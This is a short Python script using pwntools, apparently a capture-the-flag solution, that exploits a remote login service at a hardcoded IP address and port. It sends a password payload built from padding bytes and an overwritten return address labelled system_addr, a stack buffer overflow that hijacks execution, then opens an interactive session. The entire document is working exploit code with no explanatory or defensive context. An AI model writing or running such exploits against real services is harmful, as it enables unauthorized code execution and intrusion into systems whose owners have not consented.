from pwn import *

conn = remote('111.200.241.244',59320)
system_addr = 0x804868B
payload = b'A' * 0x18 + p32(system_addr) + b'A' * 232
conn.recvuntil("Your choice:")
conn.sendline("1")
conn.recvuntil("Please input your username:")
conn.sendline("aaaa")
conn.recvuntil("Please input your passwd")
conn.sendline(payload)
conn.interactive()